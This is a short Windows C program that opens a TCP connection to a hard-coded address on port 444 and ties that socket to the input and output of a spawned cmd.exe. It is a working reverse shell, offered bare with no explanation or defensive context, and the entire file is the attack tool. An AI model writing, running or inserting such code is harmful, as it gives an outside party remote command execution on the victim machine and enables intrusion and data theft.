#include <winsock2.h> 
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO ini_processo; 
PROCESS_INFORMATION processo_info;
int main(int port, char *ip) 
{
WSAStartup(MAKEWORD(2,2), &wsaData);
Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

ip = "192.168.12.237" ;
port = 444;
struct hostent *host;
host = gethostbyname(ip);
strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

hax.sin_family = AF_INET;
hax.sin_port = htons(port); hax.sin_addr.s_addr = inet_addr(ip_addr);
WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);

memset(&ini_processo,0,sizeof(ini_processo)); ini_processo.cb=sizeof(ini_processo); ini_processo.dwFlags=STARTF_USESTDHANDLES;
ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError =(HANDLE)Winsock;
CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&processo_info);
}
